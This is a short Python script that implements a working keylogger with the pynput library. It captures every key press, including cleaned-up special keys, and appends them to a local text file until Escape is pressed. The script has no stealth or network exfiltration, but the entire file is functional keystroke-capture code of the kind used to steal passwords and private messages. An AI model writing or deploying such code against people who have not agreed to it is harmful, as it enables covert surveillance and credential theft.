import pynput 
from pynput.keyboard import Key,Listener
li_keys = []
count = 0
# Define the file where you want to save the keystrokes
output_file = "keystrokes.txt"

# Functions to write the keystrokes to the file without quotes and so on
def on_press(key):        
    global li_keys , count        
    if key == Key.space:        
        li_keys.append(" ")    
    else:        
        li_keys.append(key)        
        count += 1        
        if count > 0:
            count = 0
            write_file(li_keys)
            li_keys = []

def on_release(key):
    if (key == Key.esc):
        return False
    
def write_file(li_keys):
    with open(output_file,'a') as file:
        for i in li_keys:
            k = str(i).replace("'","")
            if i == Key.backspace:
                file.write('!')
            elif i == Key.up:
                file.write(" (up) ")
            elif i == Key.down:
                file.write(" (down) ")
            elif i == Key.right:
                file.write(" (right) ")
            elif i == Key.left:
                file.write(" (left) ")
            elif i == Key.enter:
                file.write('\n')
            elif i == Key.ctrl_l or i == Key.shift or i == Key.tab or i == Key.alt_l or i ==Key.esc:
                file.write("")
            else:
                file.write(k)
            file.flush()

# Set up the listener with the custom callback
with Listener(on_press = on_press , on_release = on_release) as l:
    l.join()